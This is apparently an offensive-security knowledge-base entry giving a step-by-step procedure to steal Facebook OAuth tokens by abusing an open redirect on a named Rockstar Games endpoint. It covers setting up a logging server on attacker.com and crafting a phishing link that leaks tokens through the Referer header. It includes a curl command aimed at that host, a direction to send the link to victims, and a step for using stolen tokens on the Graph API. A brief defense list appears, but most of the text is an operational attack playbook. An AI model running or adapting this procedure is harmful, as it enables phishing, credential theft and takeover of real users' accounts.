---
id: proc-steal-facebook-oauth-token-referer
tags:
  - token-theft
  - oauth
  - phishing
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-simulate-phish-link]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:24:35.667Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---
# Steal Facebook OAuth Token via Referer

## Summary

This procedure uses the open redirect to craft phishing links that, when clicked by authenticated Facebook users, leak OAuth tokens in the Referer header to an attacker-controlled server, allowing unauthorized access to victim accounts.

## Description

By redirecting from the trusted Rockstar domain to an attacker site, the Referer header may include sensitive data like Facebook OAuth tokens if the victim is in an OAuth flow. This requires victim interaction but exploits browser behavior where Referer is sent on cross-origin requests. Outcomes include account takeover on Facebook.

## Requirements

1. Control over a logging server to capture Referer headers
2. Victim must be authenticated with Facebook and interact with the phishing link
3. Access to the vulnerable redirect endpoint

## Defense

Defensive measures and detection strategies:

- Strip or validate Referer headers on sensitive endpoints
- Educate users on phishing risks from trusted domains
- Implement OAuth token binding and short expiration times
- Log and alert on anomalous Referer patterns

## Objectives

1. Craft phishing link using open redirect
2. Capture OAuth token in Referer
3. Use token for unauthorized access

## Instructions

### Step 1: Set Up Logging Server

**Context**: Prepare an attacker server to log incoming requests and Referer headers.

Host a simple HTTP server (e.g., using Python) on attacker.com/log-referer that echoes the Referer header to a file.

### Step 2: Craft Phishing Link

**Context**: Embed the vulnerable redirect in a social-engineered link, simulating an OAuth context.

Create a link like https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer.

### Step 3: Simulate Token Leak

**Context**: Test the flow by simulating a Referer with a fake token; in real attacks, send to victims.

**Command** ([[commands/curl-simulate-phish-link]]):
```bash
curl -X GET "https://www.rockstargames.com/GTAOnline/restricted-content/agegate/form?next=http://attacker.com/log-referer" --referer "https://www.facebook.com/dialog/oauth?access_token=FAKE_TOKEN"
```

> This simulates the request with a fake Referer. In practice, monitor attacker.com for real tokens in logs from victim browsers.

### Step 4: Validate Token

**Context**: Test captured token for validity by making an API call to Facebook.

Use the token to access user data via Facebook Graph API.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Credentials In Files]]

### Sub-Techniques


## Commands Used

- [[commands/curl-simulate-phish-link]]

## Tools Used


## Tags

- token-theft
- referer-leak
- oauth-abuse
